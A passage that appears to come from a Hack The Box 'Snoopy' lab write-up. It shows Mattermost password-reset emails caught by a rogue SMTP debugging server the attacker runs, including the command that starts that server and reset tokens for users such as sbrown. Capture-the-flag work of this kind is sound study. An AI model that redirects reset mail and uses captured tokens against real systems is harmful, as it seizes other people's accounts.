b'FFF;width:100%;border-radius:8px;">'
b'        <tbody>'
b'          <tr>'
b'            <td style=3D"direction:ltr;font-size:0px;padding:24px;text-alig='
b'n:center;">'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px ='
b'0px 40px 0px;text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" style=3D"font-size:0px='
b';padding:0px;word-break:break-word;">'
b'                                  <table border=3D"0" cellpadding=3D"0" cel='
b'lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:collapse;bord='
b'er-spacing:0px;">'
b'                                    <tbody>'
b'                                      <tr>'
b'                                        <td style=3D"width:132px;">'
b'                                          <img alt height=3D"21" src=3D"htt='
b'p://mm.snoopy.htb/static/images/logo_email_dark.png" style=3D"border:0;disp='
b'lay:block;outline:none;text-decoration:none;height:21.76px;width:100%;font-='
b'size:13px;" width=3D"132">'
b'                                        </td>'
b'                                      </tr>'
b'                                    </tbody>'
b'                                  </table>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px ='
b'24px 40px 24px;text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"title" style='
b'=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"text-align: center; font-we='
b'ight: 600; font-size: 28px; line-height: 36px; letter-spacing: -0.01em; col='
b'or: #3F4350; font-family: Open Sans, sans-serif;">Reset Your Password</div>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"subTitle" sty='
b'le=3D"font-size:0px;padding:16px 24px 16px 24px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 16px; line-height: 24px; color: rgb='
b'a(63, 67, 80, 0.64);">Click the button below to reset your password. If you='
b' didn=E2=80=99t request this, you can safely ignore this email.</div>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" vertical-align=3D"midd='
b'le" class=3D"button" style=3D"font-size:0px;padding:0px;word-break:break-wo='
b'rd;">'
b'                                  <table border=3D"0" cellpadding=3D"0" cel='
b'lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:separate;line='
b'-height:100%;">'
b'                                    <tr>'
b'                                      <td align=3D"center" bgcolor=3D"#FFFF='
b'FF" role=3D"presentation" style=3D"border:none;border-radius:4px;cursor:aut='
b'o;mso-padding-alt:10px 25px;background:#FFFFFF;" valign=3D"middle">'
b'                                        <a href=3D"http://mm.snoopy.htb/res='
b'et_password_complete?token=3D7tap3c3jbdm7z8stbnhf8jksp5kc3kqp85toh71iks3d7r='
b'gn49dzh5jme5gqjppr" style=3D"display: inline-block; background: #FFFFFF; fo='
b'nt-family: Open Sans, sans-serif; margin: 0; text-transform: none; mso-padd='
b'ing-alt: 0px; border-radius: 4px; text-decoration: none; background-color: ='
b'#1C58D9; font-weight: 600; font-size: 16px; line-height: 18px; color: #FFFF='
b'FF; padding: 15px 24px;" target=3D"_blank">'
b'                                          Reset Password'
b'                                        </a>'
b'                                      </td>'
b'                                    </tr>'
b'                                  </table>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px;='
b'text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" style=3D"font-size:0px='
b';padding:0px;word-break:break-word;">'
b'                                  <table border=3D"0" cellpadding=3D"0" cel='
b'lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:collapse;bord='
b'er-spacing:0px;">'
b'                                    <tbody>'
b'                                      <tr>'
b'                                        <td style=3D"width:312px;">'
b'                                          <img alt height=3D"auto" src=3D"h='
b'ttp://mm.snoopy.htb/static/images/forgot_password_illustration.png" style='
b'=3D"border:0;display:block;outline:none;text-decoration:none;height:auto;wi='
b'dth:100%;font-size:13px;" width=3D"312">'
b'                                        </td>'
b'                                      </tr>'
b'                                    </tbody>'
b'                                  </table>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"info" style='
b'=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 14px; line-height: 20px; color: #3F='
b'4350; padding: 40px 0px;">The password reset link expires in 24 hours.</div='
b'>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'             =20'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:16px='
b' 0px 40px 0px;text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"footerTitle" ='
b'style=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-weight: 600; font-size: 16px; line-height='
b': 24px; color: #3F4350; padding: 0px 0px 4px 0px;">Questions?</div>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"footerInfo" s='
b'tyle=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 14px; line-height: 20px; color: #3F='
b'4350; padding: 0px 48px 0px 48px;">Need help or have questions? Email us at='
b'=20'
b'                                    <a href=3D"mailto:support@snoopy.htb" s='
b'tyle=3D"text-decoration: none; color: #1C58D9;">'
b'                                      support@snoopy.htb</a>'
b'                                  </div>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'             =20'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px;='
b'text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"emailFooter" ='
b'style=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 12px; line-height: 16px; color: rgb='
b'a(63, 67, 80, 0.56); padding: 8px 24px 8px 24px;">'
b'                                    =C2=A9 2022 Mattermost, Inc. 530 Lytton='
b' Avenue, Second floor, Palo Alto, CA, 94301'
b'                                  </div>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'            </td>'
b'          </tr>'
b'        </tbody>'
b'      </table>'
b'    </div>'
b'   =20'
b'  </div>'
b'</body>'
b''
b'</html>'
b''
b''
b'--b9d97383ce4bbf331733f8c570b85b47f91ce66770df45c2634afe1c8a24--'
------------ END MESSAGE ------------
```

Link

http://mm.snoopy.htb/reset_password_complete?token=7tap3c3jbdm7z8stbnhf8jksp5kc3kqp85toh71iks3d7rgn49dzh5jme5gqjppr

sbrown password reset

```python
^C┌─[htb-yougotgot@htb-05oa29kbgw]─[~]
└──╼ $sudo python3 -m smtpd -n -c DebuggingServer 10.10.14.129:25
---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']
b'MIME-Version: 1.0'
b'To: sbrown@snoopy.htb'
b'Auto-Submitted: auto-generated'
b'Precedence: bulk'
b'Reply-To: "No-Reply" <no-reply@snoopy.htb>'
b'From: "No-Reply" <no-reply@snoopy.htb>'
b'Subject: [Mattermost] Reset your password'
b'Content-Transfer-Encoding: 8bit'
b'Message-ID: <y5y1oi6bwiqdroke-1683676176@mm.snoopy.htb>'
b'Date: Tue, 09 May 2023 23:49:36 +0000'
b'Content-Type: multipart/alternative;'
b' boundary=6328f724b0112dbf8bc485f578ac5e6877360108638925e93cd51db5580e'
b'X-Peer: 10.129.221.81'
b''
b'--6328f724b0112dbf8bc485f578ac5e6877360108638925e93cd51db5580e'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/plain; charset=UTF-8'
b''
b'Reset Your Password'
b'Click the button below to reset your password. If you didn=E2=80=99t reques='
b't this, you can safely ignore this email.'
b''
b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dkbpa6='
b'zg9zsfur4o8jjynwnhao4xw7ixmx7ajdhneo6zcmfk9gsnnjsjgbjea1sbh )'
b''
b'The password reset link expires in 24 hours.'
b''
b'Questions?'
b'Need help or have questions? Email us at support@snoopy.htb ( support@snoop='
b'y.htb )'
b''
b'=C2=A9 2022 Mattermost, Inc. 530 Lytton Avenue, Second floor, Palo Alto, CA='
b', 94301'
b'--6328f724b0112dbf8bc485f578ac5e6877360108638925e93cd51db5580e'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/html; charset=UTF-8'
b''
b''
b''
b''
b'<!doctype html>'
b'<html xmlns=3D"http://www.w3.org/1999/xhtml" xmlns:v=3D"urn:schemas-microso='
b'ft-com:vml" xmlns:o=3D"urn:schemas-microsoft-com:office:office">'
b''
b'<head>'
b'  <title>'
b'  </title>'
b' =20'
b'  <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">'
b' =20'
b'  <meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3DUTF-8">'
b'  <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D='
b'1">'
b'  <style type=3D"text/css">'
b'    #outlook a {'
b'      padding: 0;'
b'    }'
b''
b'    body {'
b'      margin: 0;'
b'      padding: 0;'
b'      -webkit-text-size-adjust: 100%;'
b'      -ms-text-size-adjust: 100%;'
b'    }'
b''
b'    table,'
b'    td {'
b'      border-collapse: collapse;'
b'      mso-table-lspace: 0pt;'
b'      mso-table-rspace: 0pt;'
b'    }'
b''
b'    img {'
b'      border: 0;'
b'      height: auto;'
b'      line-height: 100%;'
b'      outline: none;'
b'      text-decoration: none;'
b'      -ms-interpolation-mode: bicubic;'
b'    }'
b''
b'    p {'
b'      display: block;'
b'      margin: 13px 0;'
b'    }'
b'  </style>'
b' =20'
b' =20'
b' =20'
b'  <link href=3D"https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400='
b',500,700" rel=3D"stylesheet" type=3D"text/css">'
b'  <style type=3D"text/css">'
b'    @import url(https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400='
b',500,700);'
b'  </style>'
b' =20'
b'  <style type=3D"text/css">'
b'    @media only screen and (min-width:480px) {'
b'      .mj-column-per-100 {'
b'        width: 100% !important;'
b'        max-width: 100%;'
b'      }'
b'    }'
b'  </style>'
b'  <style media=3D"screen and (min-width:480px)">'
b'    .moz-text-html .mj-column-per-100 {'
b'      width: 100% !important;'
b'      max-width: 100%;'
b'    }'
b'  </style>'
b'  <style type=3D"text/css">'
b'    @media only screen and (max-width:480px) {'
b'      table.mj-full-width-mobile {'
b'        width: 100% !important;'
b'      }'
b''
b'      td.mj-full-width-mobile {'
b'        width: auto !important;'
b'      }'
b'    }'
b'  </style>'
b'  <style type=3D"text/css">'
b'    @import url(https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400='
b',500,600,700);'
b''
b'    .emailBody {'
b'      background-color: #F3F3F3'
b'    }'
b''
b'    .emailBody a {'
b'      text-decoration: none !important;'
b'      color: #1C58D9;'
b'    }'
b''
b'    .title div {'
b'      font-weight: 600 !important;'
b'      font-size: 28px !important;'
b'      line-height: 36px !important;'
b'      letter-spacing: -0.01em !important;'
b'      color: #3F4350 !important;'
b'      font-family: Open Sans, sans-serif !important;'
b'    }'
b''
b'    .subTitle div {'
b'      font-size: 16px !important;'
b'      line-height: 24px !important;'
b'      color: rgba(63, 67, 80, 0.64) !important;'
b'    }'
b''
b'    .subTitle a {'
b'      color: rgb(28, 88, 217) !important;'
b'    }'
b''
b'    .button a {'
b'      background-color: #1C58D9 !important;'
b'      font-weight: 600 !important;'
b'      font-size: 16px !important;'
b'      line-height: 18px !important;'
b'      color: #FFFFFF !important;'
b'      padding: 15px 24px !important;'
b'    }'
b''
b'    .button-cloud a {'
b'      background-color: #1C58D9 !important;'
b'      font-weight: 400 !important;'
b'      font-size: 16px !important;'
b'      line-height: 18px !important;'
b'      color: #FFFFFF !important;'
b'      padding: 15px 24px !important;'
b'    }'
b''
b'    .messageButton a {'
b'      background-color: #FFFFFF !important;'
b'      border: 1px solid #FFFFFF !important;'
b'      box-sizing: border-box !important;'
b'      color: #1C58D9 !important;'
b'      padding: 12px 20px !important;'
b'      font-weight: 600 !important;'
b'      font-size: 14px !important;'
b'      line-height: 14px !important;'
b'    }'
b''
b'    .info div {'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'      padding: 40px 0px !important;'
b'    }'
b''
b'    .footerTitle div {'
b'      font-weight: 600 !important;'
b'      font-size: 16px !important;'
b'      line-height: 24px !important;'
b'      color: #3F4350 !important;'
b'      padding: 0px 0px 4px 0px !important;'
b'    }'
b''
b'    .footerInfo div {'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'      padding: 0px 48px 0px 48px !important;'
b'    }'
b''
b'    .footerInfo a {'
b'      color: #1C58D9 !important;'
b'    }'
b''
b'    .appDownloadButton a {'
b'      background-color: #FFFFFF !important;'
b'      border: 1px solid #1C58D9 !important;'
b'      box-sizing: border-box !important;'
b'      color: #1C58D9 !important;'
b'      padding: 13px 20px !important;'
b'      font-weight: 600 !important;'
b'      font-size: 14px !important;'
b'      line-height: 14px !important;'
b'    }'
b''
b'    .emailFooter div {'
b'      font-size: 12px !important;'
b'      line-height: 16px !important;'
b'      color: rgba(63, 67, 80, 0.56) !important;'
b'      padding: 8px 24px 8px 24px !important;'
b'    }'
b''
b'    .postCard {'
b'      padding: 0px 24px 40px 24px !important;'
b'    }'
b''
b'    .messageCard {'
b'      background: #FFFFFF !important;'
b'      border: 1px solid rgba(61, 60, 64, 0.08) !important;'
b'      box-sizing: border-box !important;'
b'      box-shadow: 0px 8px 24px rgba(0, 0, 0, 0.12) !important;'
b'      border-radius: 4px !important;'
b'      padding: 32px !important;'
b'    }'
b''
b'    .messageAvatar img {'
b'      width: 32px !important;'
b'      height: 32px !important;'
b'      padding: 0px !important;'
b'      border-radius: 32px !important;'
b'    }'
b''
b'    .messageAvatarCol {'
b'      width: 32px !important;'
b'    }'
b''
b'    .postNameAndTime {'
b'      padding: 0px 0px 4px 0px !important;'
b'      display: flex;'
b'    }'
b''
b'    .senderName {'
b'      font-family: Open Sans, sans-serif;'
b'      text-align: left !important;'
b'      font-weight: 600 !important;'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'    }'
b''
b'    .time {'
b'      font-family: Open Sans, sans-serif;'
b'      font-size: 12px;'
b'      line-height: 16px;'
b'      color: rgba(63, 67, 80, 0.56);'
b'      padding: 2px 6px;'
b'      align-items: center;'
b'      float: left;'
b'    }'
b''
b'    .channelBg {'
b'      background: rgba(63, 67, 80, 0.08);'
b'      border-radius: 4px;'
b'      display: flex;'
b'      padding-left: 4px;'
b'    }'
b''
b'    .channelLogo {'
b'      width: 10px;'
b'      height: 10px;'
b'      padding: 5px 4px 5px 6px;'
b'      float: left;'
b'    }'
b''
b'    .channelName {'
b'      font-family: Open Sans, sans-serif;'
b'      font-weight: 600;'
b'      font-size: 10px;'
b'      line-height: 16px;'
b'      letter-spacing: 0.01em;'
b'      text-transform: uppercase;'
b'      color: rgba(63, 67, 80, 0.64);'
b'      padding: 2px 6px 2px 0px;'
b'    }'
b''
b'    .gmChannelCount {'
b'      background-color: rgba(63, 67, 80, 0.2);'
b'      padding: 0 5px;'
b'      border-radius: 2px;'
b'      margin-right: 2px;'
b'    }'
b''
b'    .senderMessage div {'
b'      text-align: left !important;'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'      padding: 0px !important;'
b'    }'
b''
b'    .senderInfoCol {'
b'      width: 394px !important;'
b'      padding: 0px 0px 0px 12px !important;'
b'    }'
b''
b'    @media all and (min-width: 541px) {'
b'      .emailBody {'
b'        padding: 32px !important;'
b'      }'
b'    }'
b''
b'    @media all and (max-width: 540px) and (min-width: 401px) {'
b'      .emailBody {'
b'        padding: 16px !important;'
b'      }'
b''
b'      .messageCard {'
b'        padding: 16px !important;'
b'      }'
b''
b'      .senderInfoCol {'
b'        width: 80% !important;'
b'        padding: 0px 0px 0px 12px !important;'
b'      }'
b'    }'
b''
b'    @media all and (max-width: 400px) {'
b'      .emailBody {'
b'        padding: 0px !important;'
b'      }'
b''
b'      .footerInfo div {'
b'        padding: 0px !important;'
b'      }'
b''
b'      .messageCard {'
b'        padding: 16px !important;'
b'      }'
b''
b'      .postCard {'
b'        padding: 0px 0px 40px 0px !important;'
b'      }'
b''
b'      .senderInfoCol {'
b'        width: 80% !important;'
b'        padding: 0px 0px 0px 12px !important;'
b'      }'
b'    }'
b''
b'    @media only screen and (min-width:480px) {'
b'      .mj-column-per-50 {'
b'        width: 100% !important;'
b'        max-width: 100% !important;'
b'      }'
b'    }'
b'  </style>'
b'</head>'
b''
b'<body style=3D"word-spacing:normal;background-color:#FFFFFF;">'
b'  <div class=3D"emailBody" style=3D"background-color: #FFFFFF;">'
b'   =20'
b'    <div style=3D"background:#FFFFFF;background-color:#FFFFFF;margin:0px au='
b'to;border-radius:8px;max-width:600px;">'
b'      <table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D='
b'"0" role=3D"presentation" style=3D"background:#FFFFFF;background-color:#FFF='
b'FFF;width:100%;border-radius:8px;">'
b'        <tbody>'
b'          <tr>'
b'            <td style=3D"direction:ltr;font-size:0px;padding:24px;text-alig='
b'n:center;">'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px ='
b'0px 40px 0px;text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" style=3D"font-size:0px='
b';padding:0px;word-break:break-word;">'
b'                                  <table border=3D"0" cellpadding=3D"0" cel='
b'lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:collapse;bord='
b'er-spacing:0px;">'
b'                                    <tbody>'
b'                                      <tr>'
b'                                        <td style=3D"width:132px;">'
b'                                          <img alt height=3D"21" src=3D"htt='
b'p://mm.snoopy.htb/static/images/logo_email_dark.png" style=3D"border:0;disp='
b'lay:block;outline:none;text-decoration:none;height:21.76px;width:100%;font-='
b'size:13px;" width=3D"132">'
b'                                        </td>'
b'                                      </tr>'
b'                                    </tbody>'
b'                                  </table>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px ='
b'24px 40px 24px;text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"title" style='
b'=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"text-align: center; font-we='
b'ight: 600; font-size: 28px; line-height: 36px; letter-spacing: -0.01em; col='
b'or: #3F4350; font-family: Open Sans, sans-serif;">Reset Your Password</div>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"subTitle" sty='
b'le=3D"font-size:0px;padding:16px 24px 16px 24px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 16px; line-height: 24px; color: rgb='
b'a(63, 67, 80, 0.64);">Click the button below to reset your password. If you='
b' didn=E2=80=99t request this, you can safely ignore this email.</div>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" vertical-align=3D"midd='
b'le" class=3D"button" style=3D"font-size:0px;padding:0px;word-break:break-wo='
b'rd;">'
b'                                  <table border=3D"0" cellpadding=3D"0" cel='
b'lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:separate;line='
b'-height:100%;">'
b'                                    <tr>'
b'                                      <td align=3D"center" bgcolor=3D"#FFFF='
b'FF" role=3D"presentation" style=3D"border:none;border-radius:4px;cursor:aut='
b'o;mso-padding-alt:10px 25px;background:#FFFFFF;" valign=3D"middle">'
b'                                        <a href=3D"http://mm.snoopy.htb/res='
b'et_password_complete?token=3Dkbpa6zg9zsfur4o8jjynwnhao4xw7ixmx7ajdhneo6zcmf='
b'k9gsnnjsjgbjea1sbh" style=3D"display: inline-block; background: #FFFFFF; fo='
b'nt-family: Open Sans, sans-serif; margin: 0; text-transform: none; mso-padd='
b'ing-alt: 0px; border-radius: 4px; text-decoration: none; background-color: ='
b'#1C58D9; font-weight: 600; font-size: 16px; line-height: 18px; color: #FFFF='
b'FF; padding: 15px 24px;" target=3D"_blank">'
b'                                          Reset Password'
b'                                        </a>'
b'                                      </td>'
b'                                    </tr>'
b'                                  </table>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px;='
b'text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" style=3D"font-size:0px='
b';padding:0px;word-break:break-word;">'
b'                                  <table border=3D"0" cellpadding=3D"0" cel='
b'lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:collapse;bord='
b'er-spacing:0px;">'
b'                                    <tbody>'
b'                                      <tr>'
b'                                        <td style=3D"width:312px;">'
b'                                          <img alt height=3D"auto" src=3D"h='
b'ttp://mm.snoopy.htb/static/images/forgot_password_illustration.png" style='
b'=3D"border:0;display:block;outline:none;text-decoration:none;height:auto;wi='
b'dth:100%;font-size:13px;" width=3D"312">'
b'                                        </td>'
b'                                      </tr>'
b'                                    </tbody>'
b'                                  </table>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"info" style='
b'=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 14px; line-height: 20px; color: #3F='
b'4350; padding: 40px 0px;">The password reset link expires in 24 hours.</div='
b'>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'             =20'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:16px='
b' 0px 40px 0px;text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"footerTitle" ='
b'style=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-weight: 600; font-size: 16px; line-height='
b': 24px; color: #3F4350; padding: 0px 0px 4px 0px;">Questions?</div>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"footerInfo" s='
b'tyle=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 14px; line-height: 20px; color: #3F='
b'4350; padding: 0px 48px 0px 48px;">Need help or have questions? Email us at='
b'=20'
b'                                    <a href=3D"mailto:support@snoopy.htb" s='
b'tyle=3D"text-decoration: none; color: #1C58D9;">'
b'                                      support@snoopy.htb</a>'
b'                                  </div>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'             =20'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px;='
b'text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
